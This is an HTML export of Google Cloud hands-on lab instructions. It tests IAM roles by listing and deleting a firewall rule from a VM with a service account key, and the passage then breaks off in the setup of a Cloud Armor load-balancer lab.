z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ERROR: (gcloud.compute.firewall-rules.delete) Could not fetch resource:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - Insufficient Permission</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> This should not work!</span></p><p><strong><span>Note:</span></strong><span> The </span><strong><span>Compute Engine default service account</span></strong><span> does not have the right permissions to allow you to list or delete firewall rules. The same applies to other users who do not have the right roles.</span></p><h3 id='create-a-service-account-2'><span>Create a service account</span></h3><p><span>Create a service account and apply the </span><strong><span>Network Admin</span></strong><span> role.</span></p><ol start='' ><li><p><span>In the Console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>IAM &amp; admin</span></strong><span> &gt; </span><strong><span>Service Accounts</span></strong><span>.</span></p></li><li><p><span>Notice the </span><strong><span>Compute Engine default service account</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create service account</span></strong><span>.</span></p></li><li><p><span>Set the </span><strong><span>Service account name</span></strong><span> to </span><code>Network-admin</code><span> and click </span><strong><span>CREATE AND CONTINUE</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Select a role</span></strong><span>, select </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>Compute Network Admin</span></strong><span> and click </span><strong><span>CONTINUE</span></strong><span> then click </span><strong><span>DONE</span></strong><span>.</span></p></li><li><p><span>After creating the service account </span><code>Network-admin</code><span>, click on the three dots at the right corner and click </span><strong><span>Manage Keys</span></strong><span> in the dropdown, then click on </span><strong><span>Add Key</span></strong><span> and select </span><strong><span>Create new key</span></strong><span> from the dropdown. Click </span><strong><span>Create</span></strong><span> to download your JSON output.</span></p></li><li><p><span>Click </span><strong><span>Close</span></strong><span>.</span></p><p><span>A JSON key file download to your local computer. Find this key file, you will upload it into the VM in a later step.</span></p></li><li><p><span>Rename the JSON key file on your local machine to </span><strong><span>credentials.json</span></strong></p></li></ol><h4 id='test-completed-task-20'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have completed the task successfully you will be granted an assessment score.</span></p><p><span>Create a Network-admin service account.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='authorize-test-vm-and-verify-permissions'><span>Authorize test-vm and verify permissions</span></h3><p><span>Authorize </span><strong><span>test-vm</span></strong><span> to use the </span><strong><span>Network-admin</span></strong><span> service account.</span></p><p>&nbsp;</p><p><span>The Network Admin role provides permissions to:</span></p><p>&nbsp;</p><p><span>Delete the available firewall rules</span></p><p>&nbsp;</p><p><span>List the available firewall rules</span></p><p>&nbsp;</p><p><span>Modify the available firewall rules</span></p><p>&nbsp;</p><p><span>Neither list, create, modify, or delete the available firewall rules</span></p><p>&nbsp;</p><p><span>Create a firewall rules</span></p><p>&nbsp;</p><p><span>Submit</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Return to the </span><strong><span>SSH</span></strong><span> terminal of the </span><strong><span>test-vm</span></strong><span> instance.</span></p></li><li><p><span>To upload </span><strong><span>credentials.json</span></strong><span> through the SSH VM terminal, click on the </span><strong><span>Upload file</span></strong><span> icon in the upper-right corner.</span></p></li><li><p><span>Select </span><strong><span>credentials.json</span></strong><span> and upload it.</span></p></li><li><p><span>Click </span><strong><span>Close</span></strong><span> in the File Transfer window.</span><strong><span>Note</span></strong><span>: If prompted, click </span><strong><span>Retry</span></strong><span> on the </span><em><span>Connection via Cloud Identity-Aware Proxy Failed</span></em><span> dialog and re-upload the file.</span></p></li><li><p><span>Authorize the VM with the credentials you just uploaded:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth activate-service-account --key-file credentials.json</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> The image you are using has the Cloud SDK pre-installed; therefore, you don’t need to initialize the Cloud SDK. If you are attempting this lab in a different environment, make sure you have followed the </span><a href='https://cloud.google.com/sdk/downloads'><span>procedures regarding installing the Cloud SDK</span></a><span>.</span></p><ol start='' ><li><p><span>Try to list the available firewall rules:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  NETWORK  DIRECTION  PRIORITY  ALLOW &nbsp; &nbsp; DENY</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">allow-http-web-server &nbsp; default  INGRESS &nbsp;  1000 &nbsp; &nbsp;  tcp:80</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default-allow-icmp &nbsp; &nbsp;  default  INGRESS &nbsp;  65534 &nbsp; &nbsp; icmp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default-allow-internal  default  INGRESS &nbsp;  65534 &nbsp; &nbsp; all</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default-allow-rdp &nbsp; &nbsp; &nbsp; default  INGRESS &nbsp;  65534 &nbsp; &nbsp; tcp:3389</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default-allow-ssh &nbsp; &nbsp; &nbsp; default  INGRESS &nbsp;  65534 &nbsp; &nbsp; tcp:22</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>This should work!</span></p><ol start='' ><li><p><span>Try to delete the </span><strong><span>allow-http-web-server</span></strong><span> firewall rule:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules delete allow-http-web-server</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Enter </span><strong><span>Y</span></strong><span>, if asked to continue.</span></p></li></ol><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ERROR: (gcloud.compute.firewall-rules.delete) Could not fetch resource:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - Required 'compute.firewall.delete' permission for 'projects/[PROJECT_ID]/global/firewall/allow-http-web-server'</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> This should not work!</span></p><p><strong><span>Note:</span></strong><span> As expected, the </span><strong><span>Network Admin</span></strong><span> role has permissions to list but not modify/delete firewall rules.</span></p><h3 id='update-service-account-and-verify-permissions'><span>Update service account and verify permissions</span></h3><p><span>Update the </span><strong><span>Network-admin</span></strong><span> service account by providing it the </span><strong><span>Security Admin</span></strong><span> role.</span></p><p>&nbsp;</p><p><span>The Security Admin role, provides permissions to:</span></p><p>&nbsp;</p><p><span>List the available firewall rules</span></p><p>&nbsp;</p><p><span>Delete the available firewall rules</span></p><p>&nbsp;</p><p><span>Modify the available firewall rules</span></p><p>&nbsp;</p><p><span>Neither list, create, modify, or delete the available firewall rules</span></p><p>&nbsp;</p><p><span>Create a firewall rules</span></p><p>&nbsp;</p><p><span>Submit</span></p><p>&nbsp;</p><ol start='' ><li><p><span>In the Console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>IAM &amp; admin</span></strong><span> &gt; </span><strong><span>IAM</span></strong><span>.</span></p></li><li><p><span>Find the </span><strong><span>Network-admin</span></strong><span> account. Focus on the </span><strong><span>Name</span></strong><span> column to identify this account.</span></p></li><li><p><span>Click on the pencil icon for the </span><strong><span>Network-admin</span></strong><span> account.</span></p></li><li><p><span>Change </span><strong><span>Role</span></strong><span> to </span><strong><span>Compute Engine &gt; Compute Security Admin</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Return to the </span><strong><span>SSH</span></strong><span> terminal of the </span><strong><span>test-vm</span></strong><span> instance.</span></p></li><li><p><span>Try to list the available firewall rules:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  NETWORK  DIRECTION  PRIORITY  ALLOW &nbsp; &nbsp; DENY</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">allow-http-web-server &nbsp; default  INGRESS &nbsp;  1000 &nbsp; &nbsp;  tcp:80</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default-allow-icmp &nbsp; &nbsp;  default  INGRESS &nbsp;  65534 &nbsp; &nbsp; icmp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default-allow-internal  default  INGRESS &nbsp;  65534 &nbsp; &nbsp; all</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default-allow-rdp &nbsp; &nbsp; &nbsp; default  INGRESS &nbsp;  65534 &nbsp; &nbsp; tcp:3389</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default-allow-ssh &nbsp; &nbsp; &nbsp; default  INGRESS &nbsp;  65534 &nbsp; &nbsp; tcp:22</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>This should work!</span></p><ol start='' ><li><p><span>Try to delete the </span><strong><span>allow-http-web-server</span></strong><span> firewall rule:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules delete allow-http-web-server</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Enter </span><strong><span>Y</span></strong><span>, if asked to continue.</span></p></li></ol><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Deleted [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-00e186e4b1cec086/global/firewall/allow-http-web-server].</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>This should work!</span></p><p><strong><span>Note:</span></strong><span> As expected, the </span><strong><span>Security Admin</span></strong><span> role has permissions to list and delete firewall rules.</span></p><h3 id='verify-the-deletion-of-the-firewall-rule'><span>Verify the deletion of the firewall rule</span></h3><p><span>Verify that you can no longer HTTP access the external IP of the </span><strong><span>blue</span></strong><span> server, because you deleted the </span><strong><span>allow-http-web-server</span></strong><span> firewall rule.</span></p><ol start='' ><li><p><span>Return to the </span><strong><span>SSH</span></strong><span> terminal of the </span><strong><span>test-vm</span></strong><span> instance.</span></p></li><li><p><span>To test HTTP connectivity to </span><strong><span>blue</span></strong><span>&#39;s external IP, run the following command, replacing </span><strong><span>blue</span></strong><span>&#39;s external IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -c 3 &lt;Enter blue's external IP here&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> This should not work!</span></p><ol start='' ><li><p><span>Press </span><strong><span>CTRL+c</span></strong><span> to stop the HTTP request.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Provide the </span><strong><span>Security Admin</span></strong><span> role to the right user or service account to avoid any unwanted changes to your firewall rules!</span></p><h2 id='congratulations-33'><span>Congratulations!</span></h2><p><span>In this lab, you created two nginx web servers and controlled external HTTP access using a tagged firewall rule. Then, you created a service account with first the </span><strong><span>Network Admin</span></strong><span> role and used the </span><strong><span>Security Admin</span></strong><span> role to explore the different permissions of these roles.</span></p><p>&nbsp;</p><h2 id='lab---application-load-balancer-with-cloud-armor-2'><span>LAB - Application Load Balancer with Cloud Armor</span></h2><h2 id='overview-37'><span>Overview</span></h2><p><span>Google Cloud Application Load Balancing is implemented at the edge of Google&#39;s network in Google&#39;s points of presence (POP) around the world. User traffic directed to an Application Load Balancer enters the POP closest to the user and is then load balanced over Google&#39;s global network to the closest backend that has sufficient capacity available.</span></p><p><span>Cloud Armor IP allowlist/denylist enable you to restrict or allow access to your Application Load Balancer at the edge of the Google Cloud, as close as possible to the user and to malicious traffic. This prevents malicious users or traffic from consuming resources or entering your Virtual Private Cloud (VPC) networks.</span></p><p><span>In this lab, you configure an Application Load Balancer with global backends, as shown in the diagram below. Then, you stress test the Load Balancer and denylist the stress test IP with Cloud Armor.</span></p><p><img src="images\7wJtCqbfTFLwKCpOMzUSyPjVKBjUouWHbduOqMpfRiM%3D" referrerpolicy="no-referrer" alt="Network diagram that illustrates load balancing"></p><h3 id='objectives-25'><span>Objectives</span></h3><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Create HTTP and health check firewall rules</span></p></li><li><p><span>Configure two instance templates</span></p></li><li><p><span>Create two managed instance groups</span></p></li><li><p><span>Configure an Application Load Balancer with IPv4 and IPv6</span></p></li><li><p><span>Stress test an Application Load Balancer</span></p></li><li><p><span>Denylist an IP address to restrict access to an Application Load Balancer</span></p></li></ul><h2 id='setup-and-requirements-33'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-20'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-15'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' 